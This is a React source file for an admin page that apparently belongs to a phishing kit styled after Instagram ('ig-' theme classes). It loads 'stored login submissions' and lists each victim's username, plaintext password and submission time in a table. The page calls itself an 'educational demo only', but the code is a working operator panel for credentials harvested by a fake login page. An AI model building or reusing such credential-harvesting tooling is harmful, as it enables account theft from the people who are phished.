import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { fetchStoredData } from '../lib/api'
import type { StoredCredential } from '../lib/api'
import { clearAuthToken } from '../lib/auth'

export function AdminPage() {
  const navigate = useNavigate()
  const [credentials, setCredentials] = useState<StoredCredential[]>([])
  const [error, setError] = useState('')
  const [isLoading, setIsLoading] = useState(true)

  useEffect(() => {
    let isMounted = true

    async function loadData() {
      try {
        const response = await fetchStoredData()
        if (isMounted) {
          setCredentials(response.data)
        }
      } catch (loadError) {
        if (isMounted) {
          setError(
            loadError instanceof Error
              ? loadError.message
              : 'Failed to load stored data',
          )
        }
      } finally {
        if (isMounted) {
          setIsLoading(false)
        }
      }
    }

    loadData()

    return () => {
      isMounted = false
    }
  }, [])

  function handleLogout() {
    clearAuthToken()
    navigate('/')
  }

  return (
    <div className="min-h-svh bg-ig-dark-bg px-4 py-8 text-ig-dark-text">
      <div className="mx-auto max-w-5xl">
        <header className="mb-8 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
          <div>
            <h1 className="text-2xl font-semibold">Admin Data View</h1>
            <p className="mt-1 text-sm text-ig-dark-text-muted">
              Stored login submissions (educational demo only)
            </p>
          </div>
          <button
            type="button"
            onClick={handleLogout}
            className="rounded-xl border border-ig-dark-border px-4 py-2 text-sm font-medium transition-colors hover:border-ig-blue hover:text-ig-blue"
          >
            Log out
          </button>
        </header>

        {isLoading && (
          <p className="text-sm text-ig-dark-text-muted">Loading stored data...</p>
        )}

        {error && (
          <p className="rounded-xl border border-red-500/40 bg-red-500/10 px-4 py-3 text-sm text-red-300">
            {error}
          </p>
        )}

        {!isLoading && !error && (
          <div className="overflow-hidden rounded-xl border border-ig-dark-border">
            <div className="overflow-x-auto">
              <table className="w-full min-w-[640px] border-collapse text-left text-sm">
                <thead className="bg-[#1a2028] text-ig-dark-text-muted">
                  <tr>
                    <th className="px-4 py-3 font-medium">ID</th>
                    <th className="px-4 py-3 font-medium">Username</th>
                    <th className="px-4 py-3 font-medium">Password</th>
                    <th className="px-4 py-3 font-medium">Submitted At</th>
                  </tr>
                </thead>
                <tbody>
                  {credentials.length === 0 ? (
                    <tr className="border-t border-ig-dark-border">
                      <td
                        colSpan={4}
                        className="px-4 py-8 text-center text-ig-dark-text-muted"
                      >
                        No login data stored yet.
                      </td>
                    </tr>
                  ) : (
                    credentials.map((entry) => (
                      <tr
                        key={entry.id}
                        className="border-t border-ig-dark-border hover:bg-[#1a2028]/60"
                      >
                        <td className="px-4 py-3">{entry.id}</td>
                        <td className="px-4 py-3">{entry.username}</td>
                        <td className="px-4 py-3 font-mono text-ig-dark-text-muted">
                          {entry.password}
                        </td>
                        <td className="px-4 py-3 text-ig-dark-text-muted">
                          {new Date(entry.submittedAt).toLocaleString()}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
